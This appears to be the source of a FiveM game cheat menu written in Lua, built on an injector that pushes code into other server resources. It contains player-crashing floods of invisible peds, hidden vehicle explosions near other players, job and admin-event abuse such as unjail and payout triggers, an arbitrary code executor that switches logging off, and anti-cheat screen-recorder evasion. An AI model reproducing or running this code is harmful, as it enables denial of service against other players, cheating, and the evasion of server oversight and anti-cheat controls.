                                Wait(500)

                                for i = 1, #spawnedPeds do
                                    if DoesEntityExist(spawnedPeds[i]) then
                                        DeleteEntity(spawnedPeds[i])
                                    end
                                end
                                spawnedPeds = {}
                            end
                        end
                    end
                    Wait(100)
                end
            end)

         
            Citizen.CreateThread(function()
                while _G.RagdollBurstActive do
                    Wait(0)
                    for i = 1, #spawnedPeds do
                        if DoesEntityExist(spawnedPeds[i]) then
                            SetEntityVisible(spawnedPeds[i], false, false)
                        end
                    end
                end
            end)
        ]])
    end,

    function()
        MachoInjectResource("monitor", [[
            _G.RagdollBurstActive = false
        ]])
    end
)

MachoMenuCheckbox(Tab6Group1, "Explosion Sound", 
    function()
        MachoInjectResource("monitor", [[
            _G.SultanTrollActive = true
            
            Citizen.CreateThread(function()
                local sultanHash = GetHashKey("sultan")
                RequestModel(sultanHash)
                while not HasModelLoaded(sultanHash) do Wait(0) end

                while _G.SultanTrollActive do
                    local players = GetActivePlayers()
                    local myCoords = GetEntityCoords(PlayerPedId())

                    for _, player in ipairs(players) do
                        local targetPed = GetPlayerPed(player)
                        if DoesEntityExist(targetPed) and targetPed ~= PlayerPedId() then
                            local targetCoords = GetEntityCoords(targetPed)
                            
                            if #(myCoords - targetCoords) <= 200.0 then
                                local ghostCar = CreateVehicle(sultanHash, targetCoords.x, targetCoords.y, targetCoords.z, 0.0, true, false)
                                
                                SetEntityVisible(ghostCar, false, false)
                                SetEntityAsMissionEntity(ghostCar, true, true)
                                NetworkExplodeVehicle(ghostCar, true, true, 0)

                                Citizen.SetTimeout(500, function()
                                    if DoesEntityExist(ghostCar) then
                                        DeleteEntity(ghostCar)
                                    end
                                end)
                            end
                        end
                    end
                    Wait(2500)
                end
                SetModelAsNoLongerNeeded(sultanHash)
            end)
        ]])
    end,

    function()
        MachoInjectResource("monitor", [[
            _G.SultanTrollActive = false
        ]])
    end
)


MachoMenuText(Tab6Group1, "Wasabi boombox play music")


local YTLinkInput = MachoMenuInputbox(Tab6Group1, "YouTube Link:", "https://www.youtube.com")
local DistanceInput = MachoMenuInputbox(Tab6Group1, "Distance (Meters):", "300")
local VolumeInput = MachoMenuInputbox(Tab6Group1, "Volume (1-100):", "50")

MachoMenuButton(Tab6Group1, "Play Music", function()
    local link = MachoMenuGetInputbox(YTLinkInput)
    local distRaw = MachoMenuGetInputbox(DistanceInput)
    local volRaw = MachoMenuGetInputbox(VolumeInput)
    
    local distance = tonumber(distRaw) or 300.0
    local volume = tonumber(volRaw) or 50.0

    MachoInjectResource("wasabi_boombox", [[
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local currentRadioId = "machoradio" .. GetPlayerServerId(PlayerId())
        local link = "]] .. link .. [["
        local volume = ]] .. volume .. [[
        local distance = ]] .. distance .. [[.0

        TriggerServerEvent("wasabi_boombox:soundStatus", "play", currentRadioId, {
            position = coords,
            link = link,
            volume = volume / 100,
            distance = distance
        })
    ]])
    
    MachoMenuNotification("Boombox", "Music Sent to Server!")
end)





MachoMenuText(Tab6Group1, "Crash Players")


MachoMenuButton(Tab3Group1, "Crash Player TP", function()
    local myPed = PlayerPedId()
    local myPos = GetEntityCoords(myPed)
    local targetPlayers = {} 
    local radius = 50.0
    local totalPeds = 500
    local players = GetActivePlayers()

    for i = 1, #players do
        local target = players[i]
        local targetPed = GetPlayerPed(target)
        if targetPed ~= myPed then
            local targetPos = GetEntityCoords(targetPed)
            local distance = #(myPos - targetPos)
            if distance <= radius then
                table.insert(targetPlayers, {
                    id = GetPlayerServerId(target),
                    model = GetEntityModel(targetPed)
                })
            end
        end
    end

    if #targetPlayers == 0 then return end

    local pedsPerPlayer = math.floor(totalPeds / #targetPlayers)

    for _, data in ipairs(targetPlayers) do
        MachoInjectResource2(3, "monitor", string.format([[
            _G.nukeLoop = _G.nukeLoop or {}
            local tID = %d
            local mH = %d
            local amount = %d
            _G.nukeLoop[tID] = true

            Citizen.CreateThread(function()
                RequestModel(mH)
                local wait = 0
                while not HasModelLoaded(mH) and wait < 50 do Wait(100) wait = wait + 1 end
                if not HasModelLoaded(mH) then return end

                while _G.nukeLoop[tID] do
                    local targetPed = 0
                    local players = GetActivePlayers()
                    for i=1, #players do
                        local p = players[i]
                        if GetPlayerServerId(p) == tID then targetPed = GetPlayerPed(p) break end
                    end

                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                        local pos = GetEntityCoords(targetPed)
                        for i = 1, amount do
                            if not _G.nukeLoop[tID] then break end
                            local offsetX = math.random(-5, 5) + 0.0
                            local offsetY = math.random(-5, 5) + 0.0
                            
                            local ped = CreatePed(4, mH, pos.x + offsetX, pos.y + offsetY, pos.z, 0.0, true, true)
                            
                            if DoesEntityExist(ped) then
                                ClonePedToTarget(targetPed, ped)
                                SetEntityAlpha(ped, 0, false)
                                SetEntityVisible(ped, false, false)
                                SetPedCanRagdoll(ped, true)
                                SetEntityAsNoLongerNeeded(ped)
                            end
                            Wait(5)
                        end
                        _G.nukeLoop[tID] = nil
                    else
                        _G.nukeLoop[tID] = nil
                    end
                end
            end)
        ]], data.id, data.model, pedsPerPlayer))
    end

    Wait(100) 
    SetEntityCoords(myPed, myPos.x, myPos.y, myPos.z + 500.0, false, false, false, true)
    GiveWeaponToPed(myPed, GetHashKey("GADGET_PARACHUTE"), 1, false, true)
    
end)


MachoMenuText(Tab6Group2, "Framework Setjob System")

local SelectedFramework = "ESX"
local JobInputHandle = MachoMenuInputbox(Tab6Group2, "Job Name", "police") 
local GradeInputHandle = MachoMenuInputbox(Tab6Group2, "Job Grade", "0")

MachoMenuDropDown(Tab6Group2, "Select Framework", function(Index)
    local Frameworks = {"ESX", "QBCore", "QBX", "CFX"}
    SelectedFramework = Frameworks[Index + 1] or "ESX"
end, "ESX", "QBCore", "QBX", "CFX")

MachoMenuButton(Tab6Group2, "Apply Setjob Trigger", function()
    local name = MachoMenuGetInputbox(JobInputHandle)
    local gradeStr = MachoMenuGetInputbox(GradeInputHandle)
    local grade = tonumber(gradeStr) or 0

    if name == "" or name == "..." then return end

    if SelectedFramework == "ESX" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('esx:setJob', { name = name, grade = grade, label = "Injected" })
            if ESX and ESX.PlayerData then 
                ESX.PlayerData.job = { name = name, grade = grade, label = "Injected" } 
            end
        ]], name, grade))
    end

    if SelectedFramework == "QBCore" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('QBCore:Client:OnJobUpdate', { name = name, grade = { level = grade }, label = "Injected" })
            if QBCore and QBCore.Functions and QBCore.Functions.GetPlayerData then
                local pData = QBCore.Functions.GetPlayerData()
                if pData then pData.job = { name = name, grade = { level = grade }, label = "Injected" } end
            end
        ]], name, grade))
    end

    if SelectedFramework == "QBX" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('qbx_core:client:OnJobUpdate', { name = name, grade = grade })
        ]], name, grade))
    end

    if SelectedFramework == "CFX" or SelectedFramework == "Any" then
        MachoInjectResource('monitor', string.format([[
            local name, grade = "%s", %d
            TriggerEvent('player:setJob', name, grade)
            TriggerServerEvent('fivem:setJob', name, grade)
        ]], name, grade))
    end
end)





MachoMenuText(Tab6Group2, "Animals Ped (/reloadskin=back to normal)")
local SelectedPed = nil
local OriginalPed = nil

local LandAnimals = {
    "Default",
    "a_c_westy",
    "a_c_boar",
    "a_c_cat_01",
    "a_c_cow",
    "a_c_pig",
    "a_c_husky",
    "a_c_pug",
    "a_c_poodle",
    "a_c_chop",         
    "a_c_retriever",    
    "a_c_rottweiler",    
}

local BirdAnimals = {
    "Default",
    "a_c_chickenhawk", "a_c_cormorant", "a_c_crow", "a_c_hen", "a_c_pigeon", "a_c_seagull"
}

MachoMenuDropDown(Tab6Group2, "Land Animals", function(Index)
    if Index == 0 then SelectedPed = nil else SelectedPed = LandAnimals[Index + 1] end
end, table.unpack(LandAnimals))

MachoMenuDropDown(Tab6Group2, "Birds", function(Index)
    if Index == 0 then SelectedPed = nil else SelectedPed = BirdAnimals[Index + 1] end
end, table.unpack(BirdAnimals))

MachoMenuButton(Tab6Group2, "Apply Selected Ped", function()
    if SelectedPed == nil then
        MachoMenuNotification("Choose Ped Muna Jay")
        return
    end

    local model = GetHashKey(SelectedPed)
    if IsModelInCdimage(model) and IsModelValid(model) then
        if not OriginalPed then OriginalPed = GetEntityModel(PlayerPedId()) end

        RequestModel(model)
        while not HasModelLoaded(model) do Wait(0) end

        SetPlayerModel(PlayerId(), model)
        
        local newPed = PlayerPedId()
        SetEntityVisible(newPed, true, 0)
        SetEntityAlpha(newPed, 255, false)
        ResetEntityAlpha(newPed)
        SetPedDefaultComponentVariation(newPed)
        ClearPedTasksImmediately(newPed)
        
        SetModelAsNoLongerNeeded(model)
        MachoMenuNotification("Success", "Transform: " .. SelectedPed)
    end
end)


MachoMenuText(Tab6Group2, "Trigger Executor")

local targetInput = MachoMenuInputbox(Tab6Group2, "Resource Name", "e.g. monitor")
local triggerInput = MachoMenuInputbox(Tab6Group2, "Trigger", "e.g. Trigger")
local isLooping = false
MachoMenuCheckbox(Tab6Group2, "Auto-Execute Loop",
    function()
        local targetRes = MachoMenuGetInputbox(targetInput)
        local codeToRun = MachoMenuGetInputbox(triggerInput)

        if targetRes ~= "" and codeToRun ~= "" then
            isLooping = true
            MachoMenuNotification("Loop Started", "Target: " .. targetRes)
            Citizen.CreateThread(function()
                while isLooping do
                    MachoSetLoggerState(0)
                    MachoInjectResource2(3, targetRes, codeToRun)
                    Citizen.Wait(100) 
                end
            end)
        else
            isLooping = false
            MachoMenuNotification("Input Error", "Fill up boxes first!")
        end
    end,
    
    function()
        isLooping = false
        MachoMenuNotification("Loop Stopped", "Automatic execution disabled.")
    end
)

MachoMenuButton(Tab6Group2, "Execute Once", function()
    local targetRes = MachoMenuGetInputbox(targetInput)
    local codeToRun = MachoMenuGetInputbox(triggerInput)
    if targetRes ~= "" and codeToRun ~= "" then
        MachoSetLoggerState(0)
        MachoInjectResource2(3, targetRes, codeToRun)
        MachoMenuNotification("Executed", "Injected to: " .. targetRes)
    else
        MachoMenuNotification("Input Error", "Fill up both boxes!")
    end
end)





    Tab7Button = MachoMenuAddTab(TabbedWindow, "Server")
    Tab7Group1 = MachoMenuGroup(Tab7Button, "Sefe Events", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, 690-TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)
  


if CreatedButtons == nil then
    CreatedButtons = {}
end

local MenuLibrary = {
    -- [ REVIVE / HEALTH / ARMOR ]
    ['cfx-xfx-ambulance:revive'] = {name = 'CFX Revive', args = ""},
    ['esx_ambulancejob:revive'] = {name = 'ESX Revive', args = ""},
    ['hospital:client:Revive'] = {name = 'QBX Revive', args = ""},
    ['wasabi_ambulance:revive'] = {name = 'Wasabi Revive', args = ""},
    ['qb-ambulancejob:client:Revive'] = {name = 'QB Revive', args = ""},
    ['ambulance:revive'] = {name = 'Generic Revive', args = ""},
    ['esx_ambulancejob:heal'] = {name = 'ESX Heal Full', args = "'big'"},
    ['qb-ambulancejob:client:HealPlayer'] = {name = 'QB Heal Self', args = ""},
    ['hospital:client:adminHeal'] = {name = 'QBX Admin Heal', args = ""},
    ['qb-armour:client:Armor100'] = {name = 'QB Set Armor 100', args = ""},
    

    -- [ CLOTHING / SKIN / APPEARANCE ]
    ['illenium-appearance:client:openClothingShopMenu'] = {name = 'Illenium Clothing', args = "true"},
    ['fivem-appearance:client:openAppearanceMenu'] = {name = 'FiveM Appearance', args = "true"},
    ['qb-clothing:client:openMenu'] = {name = 'QB Clothing', args = ""},
    ['esx_skin:openSaveableMenu'] = {name = 'ESX Skin Menu', args = ""},
    ['raid_clothes:openMenu'] = {name = 'Raid Clothing', args = ""},
    ['rcore_clothing:openMenu'] = {name = 'Rcore Clothing', args = ""},

    -- [ STATUS / NEEDS / DRUGS ]
    ['cfx-xfx-status:add'] = {name = 'Add Hunger/Thirst', args = "'hunger', 100"},
    ['esx_status:set'] = {name = 'ESX Max Status', args = "'hunger', 1000000"},
    ['qb-hud:client:updateStatus'] = {name = 'QB Max Status', args = "100, 100"},
    ['nui_status:updateStatus'] = {name = 'NUI Update Status', args = "100, 100"},
    ['qb-tunerchip:client:TuneMenu'] = {name = 'QB Tuner Menu', args = ""},
    ['esx_optionalneeds:onDrink'] = {name = 'ESX Remove Stress', args = ""},
    ['qb-weapons:client:AddAmmo'] = {name = 'QB Add Ammo Bypass', args = "250"},

    -- [ TELEPORT / WAYPOINT / NOCLIP ]
    ['txcl:tpToWaypoint'] = {name = 'txAdmin TP Waypoint', args = ""},
    ['esx:teleport'] = {name = 'ESX TP Waypoint', args = ""},
    ['qb-admin:client:GotoWaypoint'] = {name = 'QB TP Waypoint', args = ""},
    ['qb-admin:client:ToggleNoClip'] = {name = 'QB Toggle NoClip', args = ""},
    ['AdminMenu:client:ToggleNoClip'] = {name = 'Generic NoClip', args = ""},

    -- [ POLICE / RESTRAINT / JAIL BYPASS ]
    ['esx_policejob:handcuff'] = {name = 'ESX Uncuff Self', args = ""},
    ['qb-policejob:client:GetCuffed'] = {name = 'QB Uncuff Self', args = "0"},
    ['police:client:GetCuffed'] = {name = 'Generic Uncuff', args = ""},
    ['esx_jailer:unjailTime'] = {name = 'ESX Unjail Self', args = ""},
    ['qb-prison:client:LeavePrison'] = {name = 'QB Leave Prison', args = ""},
    ['police:client:disableIsCuffed'] = {name = 'Bypass Cuff Freeze', args = ""},
    ['esx_policejob:unrestrain'] = {name = 'ESX Unrestrain', args = ""},

    -- [ VEHICLE / FUEL / REPAIR ]
    ['qb-admin:client:SaveCar'] = {name = 'Save Vehicle (QB)', args = ""},
    ['esx_utils:repairVehicle'] = {name = 'ESX Repair Car', args = ""},
    ['qb-vehiclehosting:client:RepairVehicle'] = {name = 'QB Repair Car', args = ""},
    ['fuel:setFuel'] = {name = 'Set Max Fuel', args = "100"},
    ['LegacyFuel:setFuel'] = {name = 'LegacyFuel Max', args = "100"},
    ['qb-admin:client:SpawnVehicle'] = {name = 'QB Admin Spawn Car', args = "'adder'"},
    ['qb-vehiclekeys:client:AddKeys'] = {name = 'QB Get Keys', args = "GetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId()))"},
    ['esx_mechanicjob:onRepair'] = {name = 'ESX Mechanic Repair', args = ""},

    -- [ INVENTORY / MENU DEBUG ]
    ['qb-core:client:DrawDefaultNotification'] = {name = 'Test QB Notify', args = "'Macho Connected'"},
    ['esx:showNotification'] = {name = 'Test ESX Notify', args = "'Macho Connected'"},
    
    -- [ JOBS / FARMING EXPLOITS ]
    ['qb-mine:client:MineJewel'] = {name = 'QB Mine Jewel Bypass', args = ""},
    ['esx_garbagejob:bagSuccessfullyDelivered'] = {name = 'ESX Garbage Reward', args = ""},
    ['qb-garbagejob:client:PayOut'] = {name = 'QB Garbage Payout', args = ""},
    ['fishing:client:spawnFish'] = {name = 'Generic Fish Spawn', args = ""},
    ['qb-trucker:client:PayOut'] = {name = 'QB Trucker Payout', args = ""},
    ['esx_drugs:startHarvestWeed'] = {name = 'ESX Weed Harvest', args = ""},
}



local function IsResourceTrulyActive(resName)
    if resName == "any" then return true end
    
    local state = GetResourceState(resName)
    if state ~= "started" then return false end

    local numRes = GetNumResources()
    for i = 0, numRes - 1 do
        local currentRes = GetResourceByFindIndex(i)
        if currentRes == resName then
            return true
        end
    end
    return false
end

local function BuildEverythingUnified()
    CreatedButtons = {}
    
    Citizen.CreateThread(function()
        Citizen.Wait(2000) 
        
        
        for eventName, info in pairs(MenuLibrary) do
            local resName = eventName:match("^(.-):") or "any"
            
            if IsResourceTrulyActive(resName) then
                
                if not CreatedButtons[eventName] then
                    MachoMenuButton(Tab7Group1, info.name, function()
                        local payload = (info.args ~= "") and (", " .. info.args) or ""
                        
                        MachoInjectResource2(3, resName, string.format('TriggerEvent("%s"%s)', eventName, payload))
                        
                    end)
                    
                    CreatedButtons[eventName] = true
                end
            else
            end
        end
        
    end)
end

BuildEverythingUnified()






MachoMenuText(TabbedWindow, "Configuration")
Tab1Button = MachoMenuAddTab(TabbedWindow, "Settings")
Tab1Group1 = MachoMenuGroup(Tab1Button, "Controls / Settings", TabsWidth+GroupGap, GroupTopGap+WindowTopBar, 690-TabsWidth+GroupGap+GroupSize, 500-GroupTopGap)


local specialKeys = {
    [8] = "BACK", [9] = "TAB", [13] = "ENT", [16] = "SHFT", [17] = "CTRL", [18] = "ALT",
    [27] = "ESC", [32] = "SPC", [33] = "PGUP", [34] = "PGDN", [35] = "END", [36] = "HOME", 
    [37] = "LFT", [38] = "UP", [39] = "RGT", [40] = "DWN", [45] = "INS", [46] = "DEL", 
    [112] = "F1", [113] = "F2", [114] = "F3", [115] = "F4", [116] = "F5", [117] = "F6", 
    [118] = "F7", [119] = "F8", [120] = "F9", [121] = "F10", [122] = "F11", [123] = "F12"
}

function GetKeyDisplayName(code)
    if not code then return "NONE" end
    if specialKeys[code] then return specialKeys[code] end
    if code >= 32 and code <= 126 then return string.char(code):upper() end
    return "KEY " .. tostring(code)
end








local currentMenuKey = 120 
local isListening = false
local buttonLabel = "Menu Key Bind : "

MachoMenuText(Tab1Group1, "Menu Bindings:")


local BindButton = MachoMenuButton(Tab1Group1, buttonLabel .. GetKeyDisplayName(currentMenuKey), function()


    if isListening then return end
    isListening = true

    MachoMenuSetText(BindButton, buttonLabel .. "...") 
end, 100, 50)


MachoMenuSetKeybind(TabbedWindow, currentMenuKey)


MachoOnKeyDown(function(keyCode)
    if isListening then
        currentMenuKey = keyCode
        isListening = false
       
        local newDisplayText = buttonLabel .. GetKeyDisplayName(keyCode)
        
 
        MachoMenuSetText(BindButton, newDisplayText)
        MachoMenuSetKeybind(TabbedWindow, currentMenuKey)
    end
end)


local rgbEnabled = false
local currentR, currentG, currentB = 150, 0, 255

MachoMenuCheckbox(Tab1Group1, "Rainbow Menu RGB", 
    function()
        rgbEnabled = true
        Citizen.CreateThread(function()

            local r, g, b = currentR, currentG, currentB
            
            while rgbEnabled do

                if r > 0 and b == 0 then r = r - 5 g = g + 5 end
                if g > 0 and r == 0 then g = g - 5 b = b + 5 end
                if b > 0 and g == 0 then b = b - 5 r = r + 5 end
                
                currentR, currentG, currentB = r, g, b
                
                MachoMenuSetAccent(TabbedWindow, r, g, b)
                Citizen.Wait(50) 
            end
        end)
    end,
    function()
        rgbEnabled = false
    end)

MachoMenuCheckbox(Tab1Group1, "AC Screen Recorder Blocker",
    function()
        _G.AntiVisualLogging = true
        MachoInjectResource('monitor', [[
            _G.AntiVisualLogging = true
            print("Visual Shield Active")
        ]])
    end,
    function()
        _G.AntiVisualLogging = false
        MachoInjectResource('monitor', [[
            _G.AntiVisualLogging = false
        ]])
    end)

MachoMenuButton(Tab1Group1, "Crash Game (Safe Exit)", function()
    MachoInjectResource("monitor", [[
        Citizen.CreateThread(function()
            print("^1[ERROR] ^7CCitizen-Executable: Exception (0xc0000005) at 0x1406e4a2b.")
            print("^1[ERROR] ^7Resource 'monitor' failed to fetch local player data (Buffer Overflow).")
            
            Wait(500)

            local crash = "A"
            while true do
                crash = crash .. crash
            end
        end)
    ]])
end)

if not isAlreadyAuthenticated then
    if RunAuthCheck() then
        print("^2[SYSTEM] Loading Esse Menu... F9 To Open^7")
    end

    -- ALL your menu code here...

    MachoMenuButton(Tab1Group1, "Quit Menu", function()
        MachoMenuDestroy(TabbedWindow)  
        print("Menu Closed")  
    end)

end  -- Closes the if not isAlreadyAuthenticated block
end  -- Closes the script